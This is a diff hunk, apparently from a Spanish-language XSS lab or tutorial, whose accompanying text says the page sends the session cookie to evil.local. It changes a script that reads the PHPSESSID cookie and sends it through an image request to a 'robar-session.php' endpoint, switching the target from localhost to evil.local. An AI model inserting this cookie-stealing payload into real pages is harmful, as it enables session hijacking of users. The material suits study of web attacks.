@@ -218,7 +218,7 @@ Al acceder, envía la cookie de sesión al sitio http://evil.local
 <script>
 var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
 var myImage = new Image(1,1);
-myImage.src = "http://127.0.0.1:8098/robar-session.php?session_robada=" + c;
+myImage.src = "http://evil.local/robar-session.php?session_robada=" + c;
 </script>
 
 </body>
